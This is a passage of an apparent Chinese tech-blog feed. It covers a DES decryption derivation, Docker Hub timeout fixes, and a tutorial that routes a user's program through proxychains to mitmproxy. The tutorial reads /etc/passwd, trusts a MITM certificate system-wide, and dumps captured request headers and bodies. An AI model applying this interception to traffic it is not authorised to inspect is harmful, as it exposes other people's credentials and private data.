class=\"mbin\">⊕</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.00773em;\">R</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.00773em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span><span class=\"mord mtight\">5</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.07153em;\">K</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span><span class=\"mord mtight\">6</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose\">)</span></span></span></span></p>\n<p>分析上面式子，其中<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>R</mi><mn>15</mn></msub><mo>=</mo><msub><mi>L</mi><mn>16</mn></msub></mrow><annotation encoding=\"application/x-tex\">R_{15} = L_{16}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.83333em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.00773em;\">R</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.00773em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span><span class=\"mord mtight\">5</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.83333em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">L</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span><span class=\"mord mtight\">6</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span>，<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>K</mi><mn>16</mn></msub></mrow><annotation encoding=\"application/x-tex\">K_{16}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.83333em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.07153em;\">K</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span><span class=\"mord mtight\">6</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span> 这两个部分已知，<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>R</mi><mn>16</mn></msub><mo>=</mo><msub><mi>L</mi><mn>15</mn></msub><mo>⊕</mo><mi>f</mi><mo stretchy=\"false\">(</mo><msub><mi>R</mi><mn>15</mn></msub><mo separator=\"true\">,</mo><msub><mi>K</mi><mn>16</mn></msub><mo stretchy=\"false\">)</mo></mrow><annotation encoding=\"application/x-tex\">R_{16} = L_{15} \\oplus f(R_{15}, K_{16})</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.83333em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.00773em;\">R</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.00773em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span><span class=\"mord mtight\">6</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.83333em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">L</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span><span class=\"mord mtight\">5</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">⊕</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.00773em;\">R</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.00773em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span><span class=\"mord mtight\">5</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.07153em;\">K</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span><span class=\"mord mtight\">6</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose\">)</span></span></span></span></p>\n<p>所以，我们替换一下可得 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>L</mi><mn>15</mn></msub><mo>=</mo><msub><mi>R</mi><mn>16</mn></msub><mo>⊕</mo><mi>f</mi><mo stretchy=\"false\">(</mo><msub><mi>L</mi><mn>16</mn></msub><mo separator=\"true\">,</mo><msub><mi>K</mi><mn>16</mn></msub><mo stretchy=\"false\">)</mo></mrow><annotation encoding=\"application/x-tex\">L_{15} = R_{16} \\oplus f(L_{16}, K_{16})</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.83333em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">L</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span><span class=\"mord mtight\">5</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.83333em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.00773em;\">R</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.00773em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span><span class=\"mord mtight\">6</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">⊕</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord mathnormal\">L</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span><span class=\"mord mtight\">6</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.07153em;\">K</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span><span class=\"mord mtight\">6</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose\">)</span></span></span></span>。形式上与加密过程完全一样，只需替换其中 L 和 R。所以我们可以很容易得到解密过程。</p>\n<h2 id=\"java源代码实现\"><a class=\"markdownIt-Anchor\" href=\"#java源代码实现\">#</a> java 源代码实现</h2>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3Nub3dyb2xsL2NyeXB0by9ibG9iL21haW4vc3JjL0RFU0tleUdlbmVyYXRvci5qYXZh\">https://github.com/snowroll/crypto/blob/main/src/DESKeyGenerator.java</span></p>\n<p>待开源</p>\n<blockquote>\n<p><strong>心生，种种魔生；心灭，种种魔灭。</strong></p>\n<p>——《西游记》</p>\n</blockquote>\n",
            "tags": [
                "crypto"
            ]
        },
        {
            "id": "https://snowroll.github.io/docker-timeout/",
            "url": "https://snowroll.github.io/docker-timeout/",
            "title": "dockerhub连接超时怎么办？",
            "date_published": "2024-10-30T02:00:00.000Z",
            "content_html": "<h2 id=\"检查dns配置\"><a class=\"markdownIt-Anchor\" href=\"#检查dns配置\">#</a> <strong>检查 DNS 配置</strong></h2>\n<p>修改 <code>/etc/resolv.conf</code> ，添加下面内容</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nameserver 8.8.4.4</span><br><span class=\"line\">nameserver 8.8.8.8</span><br></pre></td></tr></table></figure>\n<h2 id=\"配置代理\"><a class=\"markdownIt-Anchor\" href=\"#配置代理\">#</a> <strong>配置代理</strong></h2>\n<p>科学上网，我使用的 clash，其监听的端口为 7890，修改 http 和 https 代理</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 临时修改，在命令行中添加如下内容</span></span><br><span class=\"line\">echo HTTP_PROXY=http://127.0.0.1:7890  # clash代理端口</span><br><span class=\"line\">echo HTTPS_PROXY=http://127.0.0.1:7890</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 配置socks5</span></span><br><span class=\"line\">export ALL_PROXY=socks5://127.0.0.1:7891</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 测试代理能否访问docker源</span></span><br><span class=\"line\">curl -x http://127.0.0.1:7890 https://registry-1.docker.io/v2</span><br></pre></td></tr></table></figure>\n<h2 id=\"替换镜像源\"><a class=\"markdownIt-Anchor\" href=\"#替换镜像源\">#</a> <strong>替换镜像源</strong></h2>\n<p>由于国内政策影响，目前大部分镜像源处于不可用状态，自行寻找合适镜像源</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo vi /etc/docker/daemon.json</span><br></pre></td></tr></table></figure>\n<p>添加下面内容，只做示例。目前两个镜像均无法使用</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">     &quot;registry-mirrors&quot;: [</span><br><span class=\"line\">    \t&quot;https://hub-mirror.c.163.com&quot;,</span><br><span class=\"line\">    \t&quot;https://mirror.baidubce.com&quot;</span><br><span class=\"line\">  \t]</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>重启 docker 服务</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo systemctl daemon-reload</span><br><span class=\"line\">sudo systemctl restart</span><br></pre></td></tr></table></figure>\n<h2 id=\"手动拉取镜像\"><a class=\"markdownIt-Anchor\" href=\"#手动拉取镜像\">#</a> 手动拉取镜像</h2>\n<p>在能访问 dockhub 的电脑中拉取镜像</p>\n<ol>\n<li>\n<p>dockerhub 网站搜索镜像  <span class=\"exturl\" data-url=\"aHR0cHM6Ly9odWIuZG9ja2VyLmNvbS8lRUYlQkMlOEMlRTQlQkUlOEIlRTUlQTYlODI=\">https://hub.docker.com/，例如</span> ubuntu:latest</p>\n</li>\n<li>\n<p>手动拉取</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker pull ubuntu:latest</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>保存镜像为.tar 文件</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker save -o ubuntu_latest.tar ubuntu:latest</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>将.tar 文件上传服务器</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">scp ubuntu_latest.tar user@your_server_ip:/path/to/destination</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>服务器中加载镜像</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker load -i /path/to/destination/ubuntu_latest.tar</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<p><strong>TODO</strong></p>\n<p>这几个方法目前并不能完全解决这个问题，持续记录新的解决方法</p>\n",
            "tags": [
                "dockerß"
            ]
        },
        {
            "id": "https://snowroll.github.io/proxychain-mitm/",
            "url": "https://snowroll.github.io/proxychain-mitm/",
            "title": "proxychain流量转发+mitm流量监控",
            "date_published": "2024-09-21T09:00:00.000Z",
            "content_html": "<h1 id=\"任务目标\"><a class=\"markdownIt-Anchor\" href=\"#任务目标\">#</a> 任务目标</h1>\n<p>使用 proxychain 代理<strong>主机 A</strong> 中的二进制程序<strong> binary.exe</strong> 所有流量，并将其转发到<strong>中间人服务器 B</strong>，在 B 中使用透明代理模式，截获 binary.exe 实际与远程服务器通信的所有流量数据。</p>\n<h1 id=\"使用proxychain代理流量\"><a class=\"markdownIt-Anchor\" href=\"#使用proxychain代理流量\">#</a> 使用 proxychain 代理流量</h1>\n<ol>\n<li>\n<p>找到目前运行的相关进程</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 查找相关用户，并进行切换</span><br><span class=\"line\">cat &#x2F;etc&#x2F;passwd</span><br><span class=\"line\">sudo -i -u username</span><br><span class=\"line\"></span><br><span class=\"line\"># 列出所有进程</span><br><span class=\"line\">ps aux</span><br><span class=\"line\"></span><br><span class=\"line\"># 列出特定用户的进程</span><br><span class=\"line\">ps -u username</span><br><span class=\"line\"></span><br><span class=\"line\"># 列出指定pid的具体命令</span><br><span class=\"line\">ps -p &lt;PID&gt; -o cmd ww</span><br><span class=\"line\"></span><br><span class=\"line\"># htop也可以辅助查看进程信息</span><br><span class=\"line\">sudo apt-get install htop</span><br><span class=\"line\">htop</span><br></pre></td></tr></table></figure>\n<p>找到 userA 运行的进程 binary.exe</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">74887  userA  &#x2F;var&#x2F;lib&#x2F;xxx&#x2F;binary.exe</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>使用 socks5 代理</p>\n<p>SOCKS5 代理是一个通用代理协议，它可以处理任何类型的流量，包括 TCP 和 UDP。因此，SOCKS5 可以代理 HTTP、HTTPS、FTP、SMTP 等各种协议。 其工作在会话层（OSI 模型第 5 层）</p>\n<p>使用 A、B 两台机器进行代理转发，其中 A 为本地主机，ip 为 1.1.1.1，B 为中间人服务器，ip 为 2.2.2.2</p>\n<p><strong>机器 A：</strong></p>\n<ul>\n<li>\n<p>下载 proxychains</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt update</span><br><span class=\"line\">sudo apt install proxychains4</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>配置 proxychains 的 socks5 代理，编辑 <code>/etc/proxychains4.conf</code>  文件</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 最后一行添加代理</span><br><span class=\"line\">socks5  2.2.2.2  8080</span><br></pre></td></tr></table></figure>\n<p>proxychain 将代理 socks5 协议，并将所有的 socks5 流量转发到 2.2.2.2:8080。</p>\n</li>\n<li>\n<p>复制 B 中的 mitm 自签名证书（下载 mitmproxy 后，自签名证书存储在～/.mitmproxy/ 中），更新到系统证书库</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">scp B:&#x2F;xxx&#x2F;.mitmproxy&#x2F;mitmproxy-ca-cert.pem .&#x2F;mitmproxy-ca-cert.pem</span><br><span class=\"line\"># 添加到系统证书中，ubuntu中需要更改后缀为.crt</span><br><span class=\"line\">sudo cp .&#x2F;mitmproxy-ca-cert.pem &#x2F;usr&#x2F;local&#x2F;share&#x2F;ca-certificates&#x2F;mitmproxy.crt</span><br><span class=\"line\"># 更新证书</span><br><span class=\"line\">sudo update-ca-certificates</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>开启 proxychain 代理，监控相关程序</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo -u [username] proxychains4 yourcmd</span><br></pre></td></tr></table></figure>\n<p>监控程序的流量会被转发到 2.2.2.2:8080 端口</p>\n</li>\n</ul>\n<p><strong>机器 B：</strong></p>\n<ul>\n<li>\n<p>下载 mitmproxy</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pip install mitmproxy</span><br></pre></td></tr></table></figure>\n<p>下载成功会得到三个工具 <code>mitmproxy</code> 、 <code>mitmweb</code> 、 <code>mitmdump</code></p>\n</li>\n<li>\n<p>使用 mitmdump 开启 MITM 透明代理，并记录流量</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mitmdump -p 8080 --mode socks5 -w .&#x2F;data.mdump --set block_global&#x3D;false</span><br></pre></td></tr></table></figure>\n<p><code>-p</code>  指定监听的端口号</p>\n<p><code>--mode</code>  指定代理模式，这里选 socks5</p>\n<p><code>-w</code>  监听流量存储位置</p>\n<p><code>--set block_global=false</code>  监听来自其他主机转发的流量，所以这里设置为 false，允许处理非本地流量</p>\n</li>\n</ul>\n</li>\n</ol>\n<h2 id=\"同一台机器中进行流量代理\"><a class=\"markdownIt-Anchor\" href=\"#同一台机器中进行流量代理\">#</a> <strong>同一台机器中进行流量代理</strong></h2>\n<ol>\n<li>\n<p>安装修改 proxychain</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt-get install proxychains4</span><br><span class=\"line\"></span><br><span class=\"line\">vi &#x2F;etc&#x2F;proxychains.conf</span><br></pre></td></tr></table></figure>\n<p>在文件最后一行添加 socks5 代理</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">socks5 127.0.0.1 7888</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>启动 mitmproxy 透明代理</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mitmdump -p 7888 --mode socks5 -w .&#x2F;data.mdump</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>启动 proxychain 代理转发</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">proxychains4 cmd</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<h1 id=\"监控结果查看\"><a class=\"markdownIt-Anchor\" href=\"#监控结果查看\">#</a> 监控结果查看</h1>\n<ol>\n<li>\n<p>使用 mitmweb 查看</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 打开中间人工具的网页UI，导入指定文件查看</span></span><br><span class=\"line\">mitmweb</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>编写解析脚本</p>\n<p>python 解析脚本 <code>parse-mitm.py</code>  示例</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> mitmproxy.io <span class=\"keyword\">import</span> FlowReader</span><br><span class=\"line\"><span class=\"keyword\">from</span> mitmproxy <span class=\"keyword\">import</span> http</span><br><span class=\"line\"><span class=\"keyword\">from</span> mitmproxy <span class=\"keyword\">import</span> ctx</span><br><span class=\"line\"><span class=\"keyword\">import</span> sys</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">parse_dump</span>(<span class=\"params\">file_path</span>):</span></span><br><span class=\"line\">    <span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(file_path, <span class=\"string\">&quot;rb&quot;</span>) <span class=\"keyword\">as</span> f:</span><br><span class=\"line\">        reader = FlowReader(f)</span><br><span class=\"line\">        <span class=\"keyword\">for</span> flow <span class=\"keyword\">in</span> reader.stream():</span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"built_in\">isinstance</span>(flow, http.HTTPFlow):</span><br><span class=\"line\">                <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;Request URL: <span class=\"subst\">&#123;flow.request.pretty_url&#125;</span>&quot;</span>)</span><br><span class=\"line\">                <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;Request Headers: <span class=\"subst\">&#123;flow.request.headers&#125;</span>&quot;</span>)</span><br><span class=\"line\">                <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;Request Body: <span class=\"subst\">&#123;flow.request.text&#125;</span>&quot;</span>)</span><br><span class=\"line\">                <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;Response Status Code: <span class=\"subst\">&#123;flow.response.status_code&#125;</span>&quot;</span>)</span><br><span class=\"line\">                <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;Response Headers: <span class=\"subst\">&#123;flow.response.headers&#125;</span>&quot;</span>)</span><br><span class=\"line\">                <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;Response Body: <span class=\"subst\">&#123;flow.response.text&#125;</span>&quot;</span>)</span><br><span class=\"line\">                <span class=\"built_in\">print</span>(<span class=\"string\">&quot;-&quot;</span> * <span 